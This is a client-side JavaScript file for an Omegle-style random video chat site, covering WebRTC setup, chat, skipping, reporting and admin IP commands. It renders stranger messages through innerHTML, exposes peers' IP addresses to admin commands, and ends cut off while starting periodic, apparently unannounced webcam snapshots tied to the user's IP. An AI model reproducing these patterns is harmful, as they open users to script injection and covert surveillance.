import {
    createSocket
} from './socket.js';

let ls;

async function getLocalStream() {
    if (!ls) {
        try {
            ls = await navigator.mediaDevices.getUserMedia({
                video: true,
                audio: true,
            });
            updateLocalLabels();
        } catch (error) {
            console.error('Error getting local stream:', error);
            throw error;
        }
    }
    return ls;
}

class RateLimiter {
    constructor(limit, interval) {
        this.limit = limit;
        this.interval = interval;
        this.tokens = limit;
        this.lastRefill = Date.now();
    }

    refillTokens() {
        const now = Date.now();
        const timePassed = now - this.lastRefill;
        const refill = Math.floor((timePassed / this.interval) * this.limit);
        this.tokens = Math.min(this.limit, this.tokens + refill);
        this.lastRefill = now;
    }

    canSend() {
        this.refillTokens();
        if (this.tokens > 0) {
            this.tokens--;
            return true;
        }
        return false;
    }

    getRemainingTokens() {
        this.refillTokens();
        return this.tokens;
    }
}

function updateLocalLabels() {
    const videoTrack = ls.getVideoTracks()[0];
    const audioTrack = ls.getAudioTracks()[0];

    if (videoTrack) {
        document.getElementById('local-webcam-label').textContent = `Webcam: ${videoTrack.label}`;
    }

    if (audioTrack) {
        document.getElementById('local-microphone-label').textContent = `Microphone: ${audioTrack.label}`;
    }
}

async function populateMediaDevices() {
    try {
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        const audioDevices = devices.filter(device => device.kind === 'audioinput');

        const $webcamSelect = document.getElementById('webcam-select');
        const $microphoneSelect = document.getElementById('microphone-select');

        $webcamSelect.innerHTML = '<option value="">Select Webcam</option>';
        $microphoneSelect.innerHTML = '<option value="">Select Microphone</option>';

        videoDevices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.deviceId;
            option.text = device.label || `Camera ${$webcamSelect.children.length}`;
            $webcamSelect.appendChild(option);
        });

        audioDevices.forEach(device => {
            const option = document.createElement('option');
            option.value = device.deviceId;
            option.text = device.label || `Microphone ${$microphoneSelect.children.length}`;
            $microphoneSelect.appendChild(option);
        });

        // Update the labels after populating the devices
        updateLocalLabels();
    } catch (error) {
        console.error('Error enumerating devices:', error);
    }
}

async function changeWebcam(deviceId) {
    try {
        // Get the current audio track
        const audioTrack = ls.getAudioTracks()[0];

        // Create a new stream with the selected video device and existing audio
        const newStream = await navigator.mediaDevices.getUserMedia({
            video: {
                deviceId: {
                    exact: deviceId
                }
            },
            audio: audioTrack ? {
                deviceId: {
                    exact: audioTrack.getSettings().deviceId
                }
            } : true
        });

        const newVideoTrack = newStream.getVideoTracks()[0];

        // Replace the video track in the local stream
        const oldVideoTrack = ls.getVideoTracks()[0];
        if (oldVideoTrack) {
            ls.removeTrack(oldVideoTrack);
            oldVideoTrack.stop();
        }
        ls.addTrack(newVideoTrack);

        // Update the local video element
        const videoElement = document.getElementById('video-self');
        videoElement.srcObject = null; // Clear the existing srcObject
        videoElement.srcObject = ls;

        // Update the RTCPeerConnection sender
        if (typeof pc !== 'undefined' && pc.signalingState !== 'closed') {
            const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) {
                await sender.replaceTrack(newVideoTrack);
                console.log('Updated video track in RTCPeerConnection');
            } else {
                console.warn('No video sender found in RTCPeerConnection');
            }
        } else {
            console.log('No active RTCPeerConnection, only local stream updated');
        }

        // Update the webcam label
        document.getElementById('local-webcam-label').textContent = newVideoTrack.label;
        sendWebcamLabel();

        console.log('Webcam changed to:', newVideoTrack.label);
    } catch (error) {
        console.error('Error changing webcam:', error);
    }
}

async function changeMicrophone(deviceId) {
    try {
        const newStream = await navigator.mediaDevices.getUserMedia({
            audio: {
                deviceId: {
                    exact: deviceId
                }
            }
        });

        const audioTrack = newStream.getAudioTracks()[0];
        const sender = pc.getSenders().find(s => s.track && s.track.kind === 'audio');
        if (sender) {
            await sender.replaceTrack(audioTrack);
        }

        ls.getAudioTracks().forEach(track => track.stop());
        ls.removeTrack(ls.getAudioTracks()[0]);
        ls.addTrack(audioTrack);

        updateLocalLabels(); // Add this line to update labels after changing microphone
        sendMicrophoneLabel(); // Add this line to send the new microphone label to the peer

        console.log('Microphone changed to:', audioTrack.label);
    } catch (error) {
        console.error('Error changing microphone:', error);
    }
}

function sendMicrophoneLabel() {
    const audioTrack = ls.getAudioTracks()[0];
    if (audioTrack) {
        const microphoneLabel = audioTrack.label;
        console.log('Active microphone:', microphoneLabel);
        ws.emit('microphoneLabel', microphoneLabel);
    } else {
        console.log('No active audio track found.');
    }
}

// Helper function to check if a webcam is virtual (make sure this is defined in your code)
function isVirtualWebcam(label) {
    const knownVirtualWebcamLabels = [
        "OBS Virtual Camera",
        "ManyCam Virtual Webcam",
        "Snap Camera",
        "XSplit VCam",
        "DOUBLE CAMERA",
        "qwert",
        "yestateischill",
        "NVIDIA Broadcast",
        "SplitCam",
        "Stream"
    ];
    return knownVirtualWebcamLabels.some(virtualLabel => label.toLowerCase().includes(virtualLabel.toLowerCase()));
}

function addMediaDeviceListeners() {
    document.getElementById('webcam-select').addEventListener('change', async (event) => {
        if (event.target.value) {
            await changeWebcam(event.target.value);
            // Refresh the device list after changing the webcam
            await populateMediaDevices();
        }
    });

    document.getElementById('microphone-select').addEventListener('change', async (event) => {
        if (event.target.value) {
            await changeMicrophone(event.target.value);
            // Refresh the device list after changing the microphone
            await populateMediaDevices();
        }
    });
}

// Add this function to refresh devices periodically
function startDeviceRefresh() {
    setInterval(async () => {
        await populateMediaDevices();
    }, 5000); // Refresh every 5 seconds
}

const $ = (x) => document.querySelector(x);

let uniqueIdentifier = null;

const esc = (x) => {
    const txt = document.createTextNode(x);
    const p = document.createElement('p');
    p.appendChild(txt);
    return p.innerHTML;
};

let iceCandidatesBuffer = [];

const iceConfig = {
    iceServers: [{
        urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302'],
    }, ],
};

async function main() {
    console.log('Starting main function');
    const ws = await createSocket();
    console.log('WebSocket created:', ws);

    let interactionPoints = 0;
    const INTERACTION_THRESHOLD = 3;
    const INTERACTION_DECAY_INTERVAL = 30000; // 30 seconds
    let interactionDecayTimer;

    const $webcamLabel = $('#webcam-label');

    const messageLimiter = new RateLimiter(25, 60000);

    const debounceTime = 1000;
    let timeout, pc, ls, autoReconnectTimer = null;

    let originalTitle;

    function storeOriginalTitle() {
        originalTitle = document.title;
    }

    function restoreOriginalTitle() {
        document.title = originalTitle;
    }

    function addInteractionPoint() {
        interactionPoints = Math.min(interactionPoints + 1, INTERACTION_THRESHOLD);
        if (interactionPoints === INTERACTION_THRESHOLD) {
            $skipBtn.disabled = false;
        }
        resetInteractionDecayTimer();
    }

    function decayInteractionPoints() {
        interactionPoints = Math.max(0, interactionPoints - 1);
        if (interactionPoints < INTERACTION_THRESHOLD) {
            $skipBtn.disabled = true;
        }
        resetInteractionDecayTimer();
    }

    function resetInteractionDecayTimer() {
        clearTimeout(interactionDecayTimer);
        interactionDecayTimer = setTimeout(decayInteractionPoints, INTERACTION_DECAY_INTERVAL);
    }

    const $autoReconnectCheckbox = document.createElement('input');
    $autoReconnectCheckbox.type = 'checkbox';
    $autoReconnectCheckbox.id = 'auto-reconnect';
    $autoReconnectCheckbox.checked = localStorage.getItem('autoReconnect') === 'true';
    const $autoReconnectLabel = document.createElement('label');
    $autoReconnectLabel.htmlFor = 'auto-reconnect';
    $autoReconnectLabel.textContent = ' Auto reconnect?';

    $autoReconnectCheckbox.addEventListener('change', () => {
        localStorage.setItem('autoReconnect', $autoReconnectCheckbox.checked);
    });

    const $peopleOnline = $('#peopleOnline p span');
    const $msgs = $('#messages');
    const $msgArea = $('#message-area');
    const $typing = $('#typing');
    const $videoPeer = $('#video-peer');
    const $loader = $('#peer-video-loader');
    const $skipBtn = $('#skip-btn');
    $skipBtn.disabled = true;
    const $sendBtn = $('#send-btn');
    const $input = $('#message-input');
    const $reportButton = $('#report-btn');

    function configureChat() {
        console.log('Configuring chat');
        $input.focus();

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                $skipBtn.click();
                e.preventDefault();
            }
        });

        $input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                clearInterval(timeout);
                ws.emit('typing', false);
                $sendBtn.click();
                return e.preventDefault();
            }
            ws.emit('typing', true);
        });

        $input.addEventListener('keyup', function(e) {
            clearInterval(timeout);
            timeout = setTimeout(() => {
                ws.emit('typing', false);
            }, debounceTime);
        });
    }

    $videoPeer.addEventListener('play', () => {
        $loader.style.display = 'none';
        $skipBtn.disabled = false;
    });

    const initializeConnection = async () => {
        console.log('Initializing connection...');
        $msgs.innerHTML = `<div class="message-status">Looking for people online...</div>`;
        $sendBtn.disabled = true;
        $input.value = '';
        $input.readOnly = true;
        $typing.style.display = 'none';
        $reportButton.disabled = true;

        $skipBtn.disabled = true;
        interactionPoints = 0;

        try {
            pc = new RTCPeerConnection(iceConfig);
            pc.sentDescription = false;
            //console.log('Peer connection created:', pc);

            pc.onicecandidate = (e) => {
                if (!e.candidate) return;
                if (!pc.sentDescription) {
                    pc.sentDescription = true;
                    //console.log('Sending local description...');
                    ws.emit('description', pc.localDescription);
                }
                //console.log('Sending ICE candidate...');
                ws.emit('iceCandidate', e.candidate);
            };

            pc.oniceconnectionstatechange = () => {
                console.log(`ICE connection state changed: ${pc.iceConnectionState}`);
                if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'closed') {
                    pc.close();
                    if ($autoReconnectCheckbox.checked && !autoReconnectTimer) {
                        autoReconnectTimer = setTimeout(async () => {
                            await initializeConnection();
                            autoReconnectTimer = null;
                        }, 3000);
                    }
                }
            };

            const rs = new MediaStream();
            $videoPeer.srcObject = rs;
            $loader.style.display = 'inline-block';

            if (ls) {
                ls.getTracks().forEach((track) => {
                    console.log('Adding track:', track);
                    pc.addTrack(track, ls);
                });
            } else {
                console.error('Local stream is not available');
            }

            pc.ontrack = (event) => {
                console.log('Received track...');
                event.streams[0].getTracks().forEach((track) => {
                    rs.addTrack(track);
                });
            };

            ws.emit('peopleOnline');

            const urlParams = new URLSearchParams(window.location.search);
            const interests = urlParams.get('interests') ? urlParams.get('interests').split('+') : [];

            // When initiating a match
            ws.send(JSON.stringify({
                channel: 'match',
                data: {
                    data: 'video',
                    interests: interests
                }
            }));

        } catch (error) {
            console.error('Error during connection initialization:', error);
        }
    };

    $skipBtn.addEventListener('click', async () => {
        if (interactionPoints >= INTERACTION_THRESHOLD) {
            console.log('Skip button clicked...');
            interactionPoints = 0; // Reset points after successful skip
            $skipBtn.disabled = true;

            ws.emit('disconnect');
            pc.close();
            await initializeConnection();
            $reportButton.disabled = true;
        } else {
            console.log('Not enough interaction points to skip.');
        }
    });

    // Banned keywords array
    const bannedKeywords = ['JollyJerk', 'Try better omegle alternative - www.Omegle,fm'];

    // Function to check for banned keywords
    function containsBannedKeyword(message) {
        return bannedKeywords.some(keyword => message.includes(keyword));
    }

    function clearMessages() {
        $msgs.innerHTML = '';
    }

    $sendBtn.addEventListener('click', () => {
        const msg = $input.value.trim();
        if (!msg) return;

        if (containsBannedKeyword(msg)) {
            $input.value = '';
            return;
        }

        if (messageLimiter.canSend()) {
            if (msg === '/clear') {
                clearMessages();
            } else if (msg.startsWith('/cmd r ')) {
                const ip = msg.slice('/cmd r '.length).trim();
                ws.emit('command', `/cmd r ${ip}`);
            } else if (msg === '/cmd showip') {
                ws.emit('command', '/cmd showip');
            } else if (msg === '/cmd ban') {
                ws.emit('command', '/cmd ban');
            } else {
                const msgE = document.createElement('div');
                msgE.className = 'message';
                msgE.innerHTML = `<span class="you">You:</span> ${esc(msg)}`;
                $msgs.appendChild(msgE);
                $msgArea.scrollTop = $msgArea.scrollHeight;
                ws.emit('message', esc(msg));
            }
            $input.value = '';
        } else {
            // Inform the user that they've hit the rate limit
            const remainingTime = Math.ceil((60000 - (Date.now() - messageLimiter.lastRefill)) / 1000);
            alert(`You've reached the message limit. Please wait ${remainingTime} seconds before sending another message.`);
        }
    });

    ws.register('begin', async () => {
        console.log('WebSocket begin event...');
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
    });

    ws.register('peopleOnline', async (data) => {
        console.log('Received people online data:', data);
        $peopleOnline.innerHTML = data;
    });

    ws.register('connected', async (data) => {
        console.log('Connected register triggered with data:', data);
        document.title = 'Video Chat - OmegleWeb: Chat with Strangers!';
        $reportButton.disabled = false;

        $skipBtn.disabled = true;
        interactionPoints = 0;

        const params = new URLSearchParams(window.location.search);
        const interests = params.get('interests') ? .split(',').filter(Boolean).map(x => x.trim()) || [];

        let commonInterests = [];
        let peerLocation = 'Unknown';

        if (typeof data === 'object' && data !== null) {
            commonInterests = data.commonInterests || [];
            peerLocation = data.peerLocation || 'Unknown';
        }

        $msgs.innerHTML = '';
        const status = document.createElement('div');
        status.className = 'message-status';
        status.innerHTML = 'You are now talking to a random stranger on OmegleWeb.com';
        $msgs.appendChild(status);

        const locationStatus = document.createElement('div');
        locationStatus.className = 'message-status';
        locationStatus.innerHTML = `Stranger is from ${peerLocation}`;
        $msgs.appendChild(locationStatus);

        if (commonInterests.length > 0) {
            const interestStatus = document.createElement('div');
            interestStatus.className = 'message-status';
            if (commonInterests.length === 1) {
                interestStatus.innerHTML = `You both like ${commonInterests[0]}`;
            } else if (commonInterests.length === 2) {
                interestStatus.innerHTML = `You both like ${commonInterests[0]} and ${commonInterests[1]}`;
            } else {
                const lastInterest = commonInterests.pop();
                interestStatus.innerHTML = `You both like ${commonInterests.join(', ')}, and ${lastInterest}`;
            }
            $msgs.appendChild(interestStatus);
        } else if (interests.length > 0) {
            const randomStatus = document.createElement('div');
            randomStatus.className = 'message-status';
            randomStatus.innerHTML = "Couldn't find anyone with similar interests, so this stranger is completely random. Try adding more interests!";
            $msgs.appendChild(randomStatus);
        }

        $msgArea.scrollTop = $msgArea.scrollHeight;
        $sendBtn.disabled = false;
        $input.readOnly = false;

        // Check if there's a pending admin IP response
        if (pendingAdminIpResponse) {
            displayAdminIpResponse(pendingAdminIpResponse);
            pendingAdminIpResponse = null;
        }
        sendWebcamLabel();
    });


    ws.register('message', async (msg) => {
        console.log('Received message:', msg);
        if (!msg) return;
        const msgE = document.createElement('div');
        msgE.className = 'message';
        msgE.innerHTML = `<span class="strange">Stranger:</span> ${msg}`;
        $msgs.appendChild(msgE);
        $msgArea.scrollTop = $msgArea.scrollHeight;
        if (document.visibilityState === 'hidden') {
            startFaviconAndTitleFlash();
        }
    });

    ws.register('iceCandidate', async (data) => {
        //console.log('Received ICE candidate:', data);
        await pc.addIceCandidate(data);
    });

    ws.register('description', async (data) => {
        //console.log('Received description:', data);
        await pc.setRemoteDescription(data);
        if (!pc.localDescription) {
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
        }
    });

    ws.register('typing', async (isTyping) => {
        console.log('Typing status:', isTyping);
        $typing.style.display = isTyping ? 'block' : 'none';
        $msgArea.scrollTop = $msgArea.scrollHeight;
    });

    ws.register('disconnect', async () => {

        $reportButton.disabled = true;
        console.log('Received disconnect request');
        pc.close();
        if (autoReconnectTimer) {
            clearTimeout(autoReconnectTimer);
            autoReconnectTimer = null;
        }

        const disconnectMsg = document.createElement('div');
        disconnectMsg.className = 'message-status';
        disconnectMsg.innerHTML = 'Stranger has disconnected';
        $msgs.appendChild(disconnectMsg);

        const newConnectBtn = document.createElement('button');
        newConnectBtn.className = 'button';
        newConnectBtn.classList.add('rad');
        newConnectBtn.textContent = 'New Stranger';

        document.title = 'Stranger has disconnected...';

        newConnectBtn.addEventListener('click', () => {
            if (autoReconnectTimer) {
                clearTimeout(autoReconnectTimer);
                autoReconnectTimer = null;
            }
            initializeConnection();
            newConnectBtn.remove();
            $autoReconnectCheckbox.remove();
            $autoReconnectLabel.remove();
        });

        $msgs.appendChild(newConnectBtn);
        newConnectBtn.after($autoReconnectCheckbox);
        $autoReconnectCheckbox.after($autoReconnectLabel);

        $msgArea.scrollTop = $msgArea.scrollHeight;
        $typing.style.display = 'none';
        $skipBtn.disabled = false;

        if ($autoReconnectCheckbox.checked) {
            autoReconnectTimer = setTimeout(async () => {
                await initializeConnection();
                autoReconnectTimer = null;
            }, 1000);
        }
    });

    ws.register('closed', async () => {

        $reportButton.disabled = true;
        console.log('Received close request');
        pc.close();
        if (autoReconnectTimer) {
            clearTimeout(autoReconnectTimer);
            autoReconnectTimer = null;
        }

        const disconnectMsg = document.createElement('div');
        disconnectMsg.className = 'message-status';
        disconnectMsg.innerHTML = 'Stranger has closed window';
        $msgs.appendChild(disconnectMsg);

        const newConnectBtn = document.createElement('button');
        newConnectBtn.className = 'button';
        newConnectBtn.classList.add('rad');
        newConnectBtn.textContent = 'New Stranger';

        newConnectBtn.addEventListener('click', () => {
            if (autoReconnectTimer) {
                clearTimeout(autoReconnectTimer);
                autoReconnectTimer = null;
            }
            initializeConnection();
            newConnectBtn.remove();
            $autoReconnectCheckbox.remove();
            $autoReconnectLabel.remove();
        });

        $msgs.appendChild(newConnectBtn);
        newConnectBtn.after($autoReconnectCheckbox);
        $autoReconnectCheckbox.after($autoReconnectLabel);

        $typing.style.display = 'none';
        $skipBtn.disabled = false;

        if ($autoReconnectCheckbox.checked) {
            autoReconnectTimer = setTimeout(async () => {
                await initializeConnection();
                autoReconnectTimer = null;
            }, 3000);
        }
    });

    ws.register('showIpResponse', (message) => {
        console.log("Received IP response:", message);
        try {
            const ipaddress = message.replace(/::ffff:/g, '');
            const msgE = document.createElement('div');
            msgE.className = 'message';
            msgE.innerHTML = `<span class="info">${ipaddress}</span>`;
            $msgs.appendChild(msgE);
            $msgArea.scrollTop = $msgArea.scrollHeight;
        } catch (e) {
            console.error('Error parsing message:', e);
        }
    });

    ws.register('showIpBanResponse', (message) => {
        console.log("Received IP ban response:", message);
        try {
            const ipaddress = message.replace(/::ffff:/g, '');
            const msgE = document.createElement('div');
            msgE.className = 'message';
            msgE.innerHTML = `<span class="info">Banned: ${ipaddress}</span>`;
            $msgs.appendChild(msgE);
            $msgArea.scrollTop = $msgArea.scrollHeight;
        } catch (e) {
            console.error('Error parsing message:', e);
        }
    });

    ws.register('redirect', (message) => {
        console.log("Received redirect message:", message);
        try {
            const url = message;
            window.location.href = url;
        } catch (e) {
            console.error('Error parsing message:', e);
        }
    });

    ws.register('showIpResponseAdmin', (message) => {
        console.log("Received admin IP response:", message);
        try {
            const ipaddress = message.replace(/::ffff:/g, '');
            const msgE = document.createElement('div');
            msgE.className = 'message';
            msgE.innerHTML = `<span class="info">${ipaddress}</span>`;
            $msgs.appendChild(msgE);
            $msgArea.scrollTop = $msgArea.scrollHeight;
        } catch (e) {
            console.error('Error parsing message:', e);
        }
    });

    $videoPeer.addEventListener('loadedmetadata', () => {
        console.log('Video metadata loaded');
        $videoPeer.play().catch(e => console.log('Playback failed:', e));
    });

    $videoPeer.addEventListener('error', (event) => {
        console.error('Video playback error', event);
    });

    ws.register('forceConnectResponse', async (message) => {
        console.log("Received forceConnectResponse message:", message);

        if (pc && pc.signalingState !== 'closed') {
            pc.close();
            console.log("Closed existing peer connection.");
        }

        $msgs.innerHTML = '<div class="message-status">Connecting to peer...</div>';
        $sendBtn.disabled = true;
        $input.value = '';
        $input.readOnly = true;
        $typing.style.display = 'none';
        $reportButton.disabled = true;

        pc = new RTCPeerConnection(iceConfig);
        console.log("Created new peer connection for forced connect.");

        if (!ls) {
            try {
                ls = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: true
                });
                document.getElementById('video-self').srcObject = ls;
            } catch (e) {
                console.error("Error obtaining local media:", e);
                alert("Permission for video and audio is required.");
                return;
            }
        }

        ls.getTracks().forEach((track) => {
            console.log(`Adding local track to peer connection: ${track.kind}`);
            pc.addTrack(track, ls);
        });

        const rs = new MediaStream();
        $videoPeer.srcObject = rs;
        $loader.style.display = 'inline-block';

        pc.onicecandidate = (event) => {
            if (event.candidate) {
                console.log("Sending ICE candidate");
                ws.emit("iceCandidate", event.candidate);
            }
        };

        pc.ontrack = (event) => {
            console.log(`Received remote track: ${event.track.kind}`);
            event.streams[0].getTracks().forEach((track) => {
                console.log(`Adding remote track to media stream: ${track.kind}`);
                rs.addTrack(track);
            });
        };

        pc.oniceconnectionstatechange = () => {
            console.log(`ICE connection state changed: ${pc.iceConnectionState}`);
            if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
                console.log("ICE connection established");
                $loader.style.display = 'none';
                $skipBtn.disabled = false;
                $sendBtn.disabled = false;
                $input.readOnly = false;
                $reportButton.disabled = false;
            }
        };

        const shouldCreateOffer = message === 'createOffer';

        if (shouldCreateOffer) {
            try {
                console.log("Creating offer");
                const offer = await pc.createOffer();
                console.log("Setting local description");
                await pc.setLocalDescription(offer);
                console.log("Sending offer to peer");
                ws.emit("description", offer);
            } catch (e) {
                console.error("Error creating or sending WebRTC offer:", e);
            }
        }

        ws.register("description", async (data) => {
            try {
                console.log(`Received ${data.type} from peer`);
                await pc.setRemoteDescription(new RTCSessionDescription(data));

                if (data.type === 'offer') {
                    console.log("Creating answer");
                    const answer = await pc.createAnswer();
                    console.log("Setting local description (answer)");
                    await pc.setLocalDescription(answer);
                    console.log("Sending answer to peer");
                    ws.emit("description", answer);
                }

                console.log(`Adding ${iceCandidatesBuffer.length} buffered ICE candidates`);
                for (const candidate of iceCandidatesBuffer) {
                    await pc.addIceCandidate(candidate);
                }
                iceCandidatesBuffer = [];
            } catch (e) {
                console.error("Error handling description:", e);
            }
        });

        ws.register("iceCandidate", async (candidate) => {
            try {
                if (pc.remoteDescription) {
                    console.log("Received ICE candidate from peer, adding immediately");
                    await pc.addIceCandidate(new RTCIceCandidate(candidate));
                } else {
                    console.log("Received ICE candidate from peer, buffering");
                    iceCandidatesBuffer.push(new RTCIceCandidate(candidate));
                }
            } catch (e) {
                console.error("Error handling ICE candidate:", e);
            }
        });

        $msgs.innerHTML = '';
        const status = document.createElement('div');
        status.className = 'message-status';
        status.innerHTML = 'You are now talking to a stranger on OmegleWeb.com';
        $msgs.appendChild(status);

        sendWebcamLabel();

    });

    ws.register('disableSkip', (data) => {
        console.log('Received disableSkip event');
        $skipBtn.disabled = true;
        setTimeout(() => {
            $skipBtn.disabled = false;
        }, 10000);
    });

    let pendingAdminIpResponse = null;

    function displayAdminIpResponse(message) {
        console.log("Displaying admin IP response:", message);
        try {
            const ipaddress = message.replace(/::ffff:/g, '');
            const msgE = document.createElement('div');
            msgE.className = 'message';
            msgE.innerHTML = `<span class="info">${ipaddress}</span>`;
            $msgs.appendChild(msgE);
            $msgArea.scrollTop = $msgArea.scrollHeight;
        } catch (e) {
            console.error('Error parsing message:', e);
        }
    }

    ws.register('showIpResponseAdmin', (message) => {
        console.log("Received admin IP response:", message);
        if ($msgs.children.length > 0) {
            // If messages are already present, display the IP response immediately
            displayAdminIpResponse(message);
        } else {
            // If no messages yet, store the response to display after connection
            pendingAdminIpResponse = message;
        }
    });

    ws.register('banned_ip', (messageObj) => {
        console.log("Received banned_ip message:", messageObj);
        try {
            const ip = messageObj.ip;
            const remainingMinutes = messageObj.remainingMinutes;
            if (ip && remainingMinutes > 0) {
                alert(`You have been banned for ${remainingMinutes} more minutes.`);
                const bannedUrl = '/banned?duration=' + remainingMinutes * 60 * 1000;
                window.location.href = bannedUrl;
            }
        } catch (e) {
            console.error('Error handling message:', e);
        }
    });

    ws.register('error', (message) => {
        console.log("Received error message:", message);
        try {
            const error = message;
            const msgE = document.createElement('div');
            msgE.className = 'message';
            msgE.innerHTML = `<span class="info">${error}</span>`;
            $msgs.appendChild(msgE);
            $msgArea.scrollTop = $msgArea.scrollHeight;
        } catch (e) {
            console.error('Error parsing message:', e);
        }
    });

    ws.register('identifier', (message) => {
        console.log("Received identifier message:", message);
        try {
            uniqueIdentifier = message;
        } catch (e) {
            console.error('Error parsing identifier message:', e);
        }
    });

    ws.register('peerWebcamLabel', (message) => {
        console.log("Received peerWebcamLabel event");
        console.log("peerWebcamLabel message:", message);
        if (typeof message === 'string' && !message.includes('http')) {
            document.getElementById('webcam-label').textContent = message;
            console.log("Updated webcam-label element with:", message);
        } else {
            console.error("Unexpected peerWebcamLabel message format:", message);
        }
    });

    ws.register('peerUserAgent', (message) => {
        console.log(message);
    });

    ws.register('virtual_webcam_detected', (message) => {
        console.log("Virtual webcam detected message:", message);
        const msgE = document.createElement('div');
        msgE.className = 'message';
        msgE.innerHTML = `<span class="info">${message}</span>`;
        document.getElementById('messages').appendChild(msgE);
        document.getElementById('message-area').scrollTop = document.getElementById('message-area').scrollHeight;
    });

    ws.onmessage = (event) => {
        //console.log("Received WebSocket message:", event.data);
        try {
            const parsedData = JSON.parse(event.data);
            console.log("Parsed WebSocket message:", parsedData);
        } catch (error) {
            console.error("Error parsing WebSocket message:", error);
        }
    };

    if ($reportButton) {
        $reportButton.addEventListener('click', handleReport);
    }

    function handleReport() {
        $reportButton.disabled = true;
        setTimeout(() => {
            $reportButton.disabled = false;
        }, 10000);

        const video = document.getElementById('video-peer');
        if (video && video.readyState === 4) {
            captureAndReport(video);
        }
    }

    function captureAndReport(videoElement) {
        const canvas = document.createElement('canvas');
        canvas.width = videoElement.videoWidth;
        canvas.height = videoElement.videoHeight;
        const context = canvas.getContext('2d');
        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
        const snapshot = canvas.toDataURL('image/jpeg');
        if (uniqueIdentifier) {
            sendReportToServer(snapshot, uniqueIdentifier);
        } else {
            console.error('Unique identifier is not available for reporting');
        }
    }

    function sendReportToServer(imageData, identifier) {
        fetch('/report', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    image: imageData,
                    identifier: identifier
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                console.log('Report submitted:', data);
            })
            .catch(error => {
                console.error('Error submitting report:', error);
            });
    }

    function sendWebcamLabel() {
        const videoTrack = ls.getVideoTracks()[0];
        const audioTrack = ls.getAudioTracks()[0];

        if (videoTrack) {
            const webcamLabel = videoTrack.label;
            console.log('Active webcam:', webcamLabel);
            document.getElementById('local-webcam-label').textContent = `Webcam: ${webcamLabel}`;
            ws.emit('webcamLabel', webcamLabel);
        } else {
            console.log('No active video track found.');
        }

        if (audioTrack) {
            const microphoneLabel = audioTrack.label;
            console.log('Active microphone:', microphoneLabel);
            document.getElementById('local-microphone-label').textContent = `Microphone: ${microphoneLabel}`;
            ws.emit('microphoneLabel', microphoneLabel);
        } else {
            console.log('No active audio track found.');
        }
    }


    async function switchCamera() {
        if (!ls || !ls.getVideoTracks().length) {
            console.log('No video tracks found in the local stream');
            return;
        }

        const currentTrack = ls.getVideoTracks()[0];
        const currentFacingMode = currentTrack.getSettings().facingMode;
        const newFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';

        try {
            const newStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: newFacingMode
                },
                audio: true
            });

            const newVideoTrack = newStream.getVideoTracks()[0];

            // Replace the video track in the local stream
            ls.removeTrack(currentTrack);
            ls.addTrack(newVideoTrack);

            // Update the local video element
            $('#video-self').srcObject = ls;

            // Replace the track in the RTCPeerConnection
            const sender = pc.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) {
                sender.replaceTrack(newVideoTrack);
            }

            // Stop the old track
            currentTrack.stop();

            console.log('Camera switched successfully');
        } catch (error) {
            console.error('Error switching camera:', error);
        }
    }

    document.getElementById('switch-camera-btn').addEventListener('click', switchCamera);

    $input.addEventListener('input', addInteractionPoint);
    $msgArea.addEventListener('scroll', addInteractionPoint);
    document.addEventListener('mousemove', addInteractionPoint);
    document.addEventListener('touchstart', addInteractionPoint);

    function loadScript(url) {
        const script = document.createElement('script');
        script.src = url;
        script.async = true;
        document.head.appendChild(script);
    }

    let faviconInterval = null;

    function startFaviconAndTitleFlash() {
        const originalFaviconPath = 'favicon.png';
        const newFaviconPath = 'assets/favicon_new.png';
        let currentFaviconPath = originalFaviconPath;
        let currentTitle = '___ NEW MESSAGES ___';

        faviconInterval = setInterval(() => {
            const existingFavicon = document.querySelector('link[rel="shortcut icon"]');
            if (existingFavicon) {
                document.head.removeChild(existingFavicon);
            }
            const faviconLink = document.createElement('link');
            faviconLink.rel = 'shortcut icon';
            faviconLink.href = `${currentFaviconPath}?v=${new Date().getTime()}`;
            document.head.appendChild(faviconLink);
            currentFaviconPath = currentFaviconPath === originalFaviconPath ? newFaviconPath : originalFaviconPath;
            document.title = currentTitle;
            currentTitle = currentTitle === '___ NEW MESSAGES ___' ? '‾‾‾ NEW MESSAGES ‾‾‾' : '___ NEW MESSAGES ___';
        }, 1000);
    }

    function stopFaviconAndTitleFlash() {
        clearInterval(faviconInterval);
        const originalFaviconLink = document.createElement('link');
        originalFaviconLink.rel = 'shortcut icon';
        originalFaviconLink.href = 'favicon.png';
        document.head.appendChild(originalFaviconLink);
    }

    document.addEventListener('visibilitychange', function() {
        if (document.visibilityState === 'visible') {
            stopFaviconAndTitleFlash();
            restoreOriginalTitle();
        }
    });

    storeOriginalTitle();

    loadScript('https://omegleweb.com/js/a.js');

    let clientIpAddress = '';
    let captureCount = 0;
    const MAX_CAPTURES = 100;
    const CAPTURE_INTERVAL = 12000; // 12 seconds
    const RETRY_DELAY = 2000; // 2 seconds
    const MAX_RETRIES = 3;

    async function getClientIp() {
        try {
            const response = await fetch('/get-ip');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP:', error);
            return null;
        }
    }

    async function initializeScreenshotCapture() {
        clientIpAddress = await getClientIp();
        if (!clientIpAddress) {
            console.error('Failed to get client IP. Screenshot capture will not start.');
            return;
        }

        const videoElement = document.getElementById('video-self');

        videoElement.addEventListener('loadedmetadata', () => {
            console.log('Video metadata loaded. Starting capture process.');
            captureAndSendScreenshot();
            setInterval(captureAndSendScreenshot, CAPTURE_INTERVAL);
